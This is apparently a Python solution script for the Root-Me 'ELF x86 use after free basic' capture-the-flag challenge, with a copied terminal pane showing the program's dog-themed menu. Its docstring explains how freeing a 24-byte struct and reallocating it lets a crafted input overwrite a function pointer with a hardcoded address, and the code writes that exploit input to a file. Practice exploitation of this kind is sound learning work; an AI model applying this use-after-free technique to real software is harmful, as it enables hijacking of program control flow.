class Actions:                                                                                                       │john@john:~/ctfs/rootme/app_system/elfx86_use_after_free_basic$ echo -ne "1: Buy a dog\n2: Make him bark\n3: Bring me
    BuyADog = b'1'                                                                                                   │ the flag\n4: Watch his death\n5: Build dog house\n6: Give dog house to your dog\n7: Break dog house\n0: Quit"
    MakeHimBark = b'2'                                                                                               │1: Buy a dog
    BringMeTheFlag = b'3'                                                                                            │2: Make him bark
    WatchHisDeath = b'4'                                                                                             │3: Bring me the flag
    BuildADogHouse = b'5'                                                                                            │4: Watch his death
    GiveDogHouseToYourDog = b'6'                                                                                     │5: Build dog house
    BreakDogHouse = b'7'                                                                                             │6: Give dog house to your dog
                                                                                                                     │7: Break dog house
                                                                                                                     │0: Quitjohn@john:~/ctfs/rootme/app_system/elfx86_use_after_free_basic$ 
                                                                                                                     │
def main():
    """
    Use after free bug relies on the implementation of malloc and free. 
    The way the work is explained Here: https://stackoverflow.com/questions/1119134/how-do-malloc-and-free-work

    Ok so now we now that free doesn't always returns the memory to the OS, and in this case
    it's definately not returned since we're talking about a very small piece of memory (about 24 bytes).
    In addition, the DogHouse and Dog structs are at the same length of 24 bytes which means when you
    free one of them, the next malloc usage is going to give you the same address.

    Now we can take advantage out of it by replacing bark() pointer with bringBackTheFlag() pointer.
    In order to do that simply do as follows:
     -) Using the readelf command  find the address of bringBackTheFlag
     -) Run the elf file
     -) Buy a dog with whatever name u want
     -) Kill the dog :(
     -) Build a dog house with address that its last 4 bytes are the bringBackTheFlag address, since we want to write to index 12 in the Dog 
        struct which is the brark function. The house name doesn't matter.
     -) Choose Bring me the flag
    """                                                                                                          │
    dog_name = b'Plotu'                                                                                              │
    house_address = b'a' * 12 + int.to_bytes(0x80487cb, 4, 'little')                                                 │
    house_name = b'irelevant'                                                                                        │
                                                                                                                     │
    with open('input', 'wb') as input_file:                                                                          │
        input_file.write(Actions.BuyADog + b'\n')                                                                    │
        input_file.write(dog_name + b'\n')                                                                           │
        input_file.write(Actions.WatchHisDeath + b'\n')                                                              │
        input_file.write(Actions.BuildADogHouse + b'\n')                                                             │
        input_file.write(house_address + b'\n')                                                                      │
        input_file.write(house_name + b'\n')                                                                         │
        input_file.write(Actions.BringMeTheFlag + b'\n')                                                             │
                                                                                                                     │
                                                                                                                     │
if __name__ == '__main__':                                                                                           │
    main()
